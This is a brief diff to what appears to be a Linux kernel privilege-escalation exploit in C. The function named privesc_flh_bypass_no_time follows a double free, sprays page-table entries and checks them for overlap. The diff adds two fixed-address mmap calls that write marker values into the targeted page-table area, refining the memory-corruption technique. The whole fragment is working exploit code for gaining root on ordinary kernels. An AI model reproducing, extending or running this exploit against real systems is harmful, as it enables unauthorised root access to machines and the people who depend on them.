@@ -356,6 +356,10 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	//printf("[*] SLEEP 1s after double free...\n");
 	//sleep(1);
 	*(unsigned long long*)_pmd_area = 0xCAFEBABE;
+	_pmd_area = mmap((void*)PTI_TO_VIRT(1, 1, 0, 0, 0), 0x800000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+	*(unsigned long long*)_pmd_area = 0xCAFEBAB1;
+	_pmd_area = mmap((void*)PTI_TO_VIRT(1, 1, 0, 0, 0), 0xc00000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+	*(unsigned long long*)_pmd_area = 0xCAFEBAB2;
 
 	printf("[*] checking %d sprayed pte's for overlap...\n", CONFIG_PTE_SPRAY_AMOUNT);
 
